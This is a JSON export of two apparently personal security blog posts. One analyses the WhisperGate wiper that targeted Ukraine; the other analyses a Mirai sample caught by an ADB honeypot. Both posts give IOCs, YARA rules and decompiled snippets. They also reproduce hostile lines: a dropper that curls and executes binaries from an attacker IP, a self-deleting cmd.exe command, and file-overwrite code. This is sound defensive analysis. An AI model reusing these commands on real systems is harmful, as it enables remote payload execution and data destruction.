[{"content":"Introduction Destructive malware is some of the most dangerous software out there. Where a malicious coin miner might slow down your system or a RAT might be used to exfiltrate sensitive data, destructive malware exists for one purpose, causing damage. Arguably one of the most popular cyber attacks in history Stuxnet, was destructive in nature. The main aspect of ransomware that makes it so dangerous is it\u0026rsquo;s destructive nature, if it didn\u0026rsquo;t encrypt a system and make it unusable would anyone pay the ransom?\nOn 1/15/2022 Microsoft released information on a new campaign targetting Ukrainian systems with destructive malware. It includes four different stages:\nA purely destructive MBR wiper that displays a ransom note on next bootup. Downloader that\u0026rsquo;s used to download other stages of the attack. Payload that adds an exclusion to Windows Defender and allows the final stage to be ran. File corrupter that will corrupt any files with a specific extension. IOCs Stage 1: SHA256: a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92\nUnique Strings: 1 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv 1 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65 1 You should pay us $10k via bitcoin wallet System Behavior: Overwritting \u0026ldquo;\\\\.\\PhysicalDrive0\u0026rdquo; (MBR) with 512 bytes of the ransom note.\nVirusTotal: https://www.virustotal.com/gui/file/a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92/detection\nStage 2: SHA256: dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78\nUnique Strings: :::info Make sure to specify 16 byte length when running strings strings -e b file_name to see these. :::\n1 DxownxloxadDxatxxax 1 ttps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg System Behavior: Powershell executing a base64 encoded payload.\nDNS request and subsequent file download from cdn.discordapp.com\nVirusTotal: https://www.virustotal.com/gui/file/dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78\nStage 3: SHA256: 9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d\nVirusTotal: https://www.virustotal.com/gui/file/9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d\nStage 4: SHA256: 34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907\nUnique Strings: 1 cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 \u0026gt; Nul \u0026amp; Del /f /q \u0026#34;%s\u0026#34; System Behavior: Mass file writing and data corruption.\nPinging 111.111.111.111 and then deleting itself.\nVirusTotal: https://www.virustotal.com/gui/file/34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907\nStage 1 Stage 1 is a pretty basic executable. Essentially all it does is overwrite the MBR with the ransom note. It uses CreateFileW to create a file handler pointing to the Master Boot Record and uses WriteFile to overwrite the MBR with the ransom note.\nOnce this stage is executed the host machine is left inoperable. Interestingly enough, if a machine is utilizing UEFI (and cmon, its 2022. Every machine should be) the ransom note will not be displayed on next bootup but the host will still be inoperable.\nScreenshot of impacted host: The ransom note is quite humorous as by the time any user sees this message, the computer has been damaged and the MBR already wiped and there is no function to fix any damage caused. Thankfully no one has fallen for this and the BTC address has not received much BTC at the time of this post: 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv\nDecompiled wiper function: Detection Rules: Yara: 1 2 3 4 5 6 7 8 9 10 11 12 13 rule whispergate_stage_1 { meta: author = \u0026#34;Nathan Burns\u0026#34; date = \u0026#34;1/30/2022\u0026#34; md5 = \u0026#34;5d5c99a08a7d927346ca2dafa7973fc1\u0026#34; strings: $s1 = \u0026#34;1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv\u0026#34; $s2 = \u0026#34;8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65\u0026#34; $f1 = \u0026#34;WriteFile\u0026#34; $f2 = \u0026#34;CreateFileW\u0026#34; condition: 1 of ($s*) and 1 of ($f*) } MITRE ATT\u0026amp;CK Techniques T1561.002 - Disk Structure Wipe\nT1491.001 - Internal Defacement\nStage 2 Stage 2 is where it gets more complex. It contains obfuscated code and starts downloading the next stage. I have zero experience decompiling .NET malware, but I was able to grab some interesting strings and see some weird behavior. A very interesting string is that this stage attempts to pull malware from discord, behavior that\u0026rsquo;s been seen in the past.\nIt also attempts to evade detection by \u0026ldquo;obfuscating\u0026rdquo; some variables It\u0026rsquo;s my guess that this stage is purely a dropper for stage 3, but my .NET decompilation skills are extremely weak so I decided to just run it in a closed lab environment with some sysmon rules. I plan on making a blogpost later on after I create a more detailed and hopefully safer malware analysis lab.\nAnyways, this was the behavior I spotted after running it in a lab environment.\nThe first thing it does it run this obfuscated powershell command:\nDecoded command:\nThis command sleeps the script for 10 seconds until it downloads the stage 3 binary from cdn.discordapp.com, presumably using the obfuscated DownloadData powershell command.\nThis is all I could gather from the stage 2 binary, but it most certainly executes the stage 3 binary after successful download as well.\nDetection Rules: YARA: 1 2 3 4 5 6 7 8 9 10 11 rule whispergate_stage_2 { meta: author = \u0026#34;Nathan Burns\u0026#34; date = \u0026#34;1/30/2022\u0026#34; md5 = \u0026#34;14c8482f302b5e81e3fa1b18a509289d\u0026#34; strings: $s1 = \u0026#34;DxownxloxadDxatxxax\u0026#34; wide ascii $s2 = \u0026#34;ttps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg\u0026#34; wide ascii condition: $s1 or $s2 } MITRE ATT\u0026amp;CK Techniques T1059.001 - Command and Scripting Interpreter: PowerShell\nT1583.006 - Acquire Infrastructure: Web Services\nStage 3 Unfortunately I couldn\u0026rsquo;t get my hands on the original stage 3 binary so I can\u0026rsquo;t do much analysis. Sorry!\nStage 4 This is a rather destructive final stage. It contains a list of file extensions that it will attempt to corrupt and then finally it will delete itself. To ensure the device is still \u0026ldquo;operable\u0026rdquo; it will ignore files in the Windows directory.\nFile Corrupter Function:\nOpening File:\n1 _File = _wfopen(Filename,L\u0026#34;wb\u0026#34;); Writing data to file (Corrupting it in the process):\n1 fwrite(_Str,1,0x100000,_File); Renaming file:\n1 _wrename(Filename,pwVar2); Deletes self after being ran:\n1 cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 \u0026gt; Nul \u0026amp; Del /f /q \u0026#34;%s\u0026#34; Lab Analysis: Creating test files inside users download folder: Files after execution of stage_4.exe: (Note the randomized file extensions) Sysmon logs generated: Changing file extension and overwriting data: Executing cleanup command to evade detection: Corrupting additional files: Detection Rules: Yara: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 rule whisphergate_stage_4 { meta: author = \u0026#34;Nathan Burns\u0026#34; date = \u0026#34;1/30/2022\u0026#34; md5 = \u0026#34;3907c7fbd4148395284d8e6e3c1dba5d\u0026#34; strings: $f1 = \u0026#34;cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 \u0026gt; Nul \u0026amp; Del /f /q\u0026#34; $x1 = \u0026#34;.BACKUP\u0026#34; wide ascii $x2 = \u0026#34;.SQLITE3\u0026#34; wide ascii $x3 = \u0026#34;.DOCX\u0026#34; wide ascii condition: $f1 and 1 of ($x*) } MITRE ATT\u0026amp;CK Techniques: T1485 - Data Destruction\nT1070.004 - Indicator Removal on Host: File Deletion\nConclusion This malware attack was focused on one thing, causing damage and destroying data. There are no attempts to exfiltrate data or take control of any systems leading me to believe the primary goal of this attack was to sow doubt in Ukraine\u0026rsquo;s ability to defend itself in cyber space. It would be a crime not to mention how this attack coincides with the current Russian military buildup on Ukraine\u0026rsquo;s border.\nYou may have noticed some changes from my regular blog posts, most notably including YARA rules and MITRE ATT\u0026amp;CK Techniques. I\u0026rsquo;m hoping these additions help defenders secure their networks against these attacks and help me improve my own skills.\nAnalyzing this sample has been an amazing learning experience, if you have any suggestions or concerns, please don\u0026rsquo;t hestitate to contact me.\nReferences: https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/ Great article that has information on Stage 3. https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/ Original Microsoft blog on WhisperGate. ","date":"2022-01-16T00:00:00Z","image":"https://demo.stack.jimmycai.com/p/whispergate/whisper_hu99a54d96029b77e75edf6d51ed44e6da_1324271_120x120_fill_q75_box_smart1.jpg","permalink":"https://demo.stack.jimmycai.com/p/whispergate/","title":"Deconstructing WhisperGate"},{"content":"Intro I recently found out Google Cloud offers $300 for first time users, so I figured what better way to spend that than deploying a honeypot? While this blog post won\u0026rsquo;t go into detail on deploying one yourself (keep at eye on my docs for a that) it will go into detail analyzing a malware sample that I discovered being deployed against it.\nTimeline and Recon On January 4th 2022 at ~20:30 UTC my honeypot deployed in Oregon was attacked by 205.185.123.62 hosted in Las Vegas, Nevada. It\u0026rsquo;s hosted by \u0026ldquo;Frantech Solutions\u0026rdquo; which a cursoury google search gives results such as \u0026ldquo;FranTech Solutions is a high fraud risk ISP..\u0026rdquo; and scamalytics gives it a score of 64.\nMy honeypot was attacked a total of 24 times from this IP address. Starting at 20:30 UTC and ending at 11:00 UTC.\nAttack Vector This attack was caught by the ADBHoney service running on my honeypot. ADBHoney describes itself as a \u0026ldquo;Low interaction honeypot designed for Android Debug Bridge over TCP/IP.\u0026rdquo; Now I have some experience with ADB in a prior CTF so I understood a small bit of what this honeypot does. ADB is the Andriod Debug Bridge. It\u0026rsquo;s essentially a protocol/tool that allows developers to communicate with andriod devices. It\u0026rsquo;s used prominately in the emulation part of Andriod Studio. Unfortunately for us, the TCP section of the ADB protocol does not have any kind of authentication, leaving it open to attacks. This is what the honeypot sets up to gather samples.\nPayload Figure 1: Inital Attack\nAs we can see in Figure 1, the inital attack involves moving into the tmp directory, using busybox to execute wget to get another sample and executes it. It repeats this twice, opting for curl for the second sample. Switching tools like that is common in malware droppers, allowing it to be ran on more hosts. A potential target could be missing either curl or wget, but missing both would be unlikely. Both w.sh and c.sh are essentially the same file as seen below. The only difference being what tool is used to download the next stage.\nFigure 2: wget method\nFigure 3: curl method\nHere we can see how the actual malware sample is being downloaded. What makes this particular malware sample interesting is how it has different exectuables for a large set of instruction sets, ranging from ARM to SH4 to MIPS and even sparc. The first part of each line is downloading the malware curl htt[p]s://209.141.33.122/arm, then setting it as executable chmod 777 arm, then executing it with the argument of \u0026ldquo;android\u0026rdquo; ./arm android. The final part of the script rm $0 is deleting the script that was just ran in an effort to evade analysis.\nDetection Rate and VirusTotal Uploading the MIPS sample to VirusTotal gives it a detection ratio of 36/56 and most AV vendors classify this sample as belonging to the Mirai botnet. It was first seen on December 29th, 2021.\nVirusTotal Link: https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection\nIOCs If you see network activity to these IPs/Domains or system activity relating to them, you might be infected.\nIPs: 209.141.33.122\nDomains: bots1.firewalla1337.cc, scan1.firewalla1337.cc\nSystem Activity: Creation of binaries in /data/local/tmp with the names of common instruction sets. Execution of binaries with the argument of android.\nAnalysis Note: My reversing skills are still in its infancy, so please bear with me.\nThe first thing I did to this binary was run strings against it. This gave me some interesting findings seen below:\nStrings /dev/null\nPOST /cdn-cgi/\nHTTP/1.1\\r\\nUser-Agent:\n\\r\\nHost:\nCookie: bots1.firewalla1337.cc\n209.141.33.122\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678\ndadlcldadg scan1.firewalla1337.cc\nLets open this sample in ghidra and look into it a bit further.\nThe only function I could make sense of was what to me looks like a domain resolution function here:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void FUN_00410544(void) { byte *pbVar1; uint uVar2; undefined2 *puVar3; int iVar4; pbVar1 = (byte *)FUN_00411908(\u0026#34;bot[s]1.firewalla1337.cc\u0026#34;); if (pbVar1 != (byte *)0x0) { iVar4 = *(int *)(pbVar1 + 4); uVar2 = FUN_00411518(); if (*pbVar1 == 0) { trap(0x1c00); } DAT_0045d784 = *(undefined4 *)((uVar2 % (uint)*pbVar1) * 4 + iVar4); FUN_0041189c(pbVar1); FUN_00414e24(1); puVar3 = (undefined2 *)FUN_00414d0c(1,0); DAT_0045d782 = *puVar3; /* WARNING: Could not recover jumptable at 0x00410634. Too many branches */ /* WARNING: Treating indirect jump as call */ FUN_00414d40(1); return; } DAT_0045d784 = FUN_00417c20(\u0026#34;209.1[4]1.33.122\u0026#34;); return; } Brackets in IP address and Domain added by myself\nBoth the domain name and IP address are hardcoded, but these are both the same address of the machine where the attack originated from meaning we dont have the C2\u0026rsquo;s address.\nThere are references to POSTs and setting URL variables in the malware which tells me that\u0026rsquo;s most likely the way communication is handled between the C2 and the bots.\nClosing Thoughts Unfortunately this is the extent of my analysis of this sample. My reversing skills arent where they should be in order to properly reverse this sample. I would try dynamic analysis and see what domains/IPs this sample tries to contact, but the x86 version was not available and I do not have any spare system capable of executing the other instruction sets besides my Raspberry Pi4s, so lookout for a potential part 2 of this post where I execute the malware in a lab environment.\nThank you so much for reading this post. I learned a lot while investigating this sample and hopefully you learned something new reading this blog post. I hope to post more about my activities with my honeypot so keep an eye out for those posts when they drop.\nAs always, if you have any feedback please don\u0026rsquo;t hesitate to contact me at my email.\nNathan Burns\n","date":"2022-01-04T00:00:00Z","image":"https://m.media-amazon.com/images/I/41ZJaKEDzNL._AC_SX355_.jpg","permalink":"https://demo.stack.jimmycai.com/p/mirai_botnet/","title":"Analysis of Mirai Malware"}]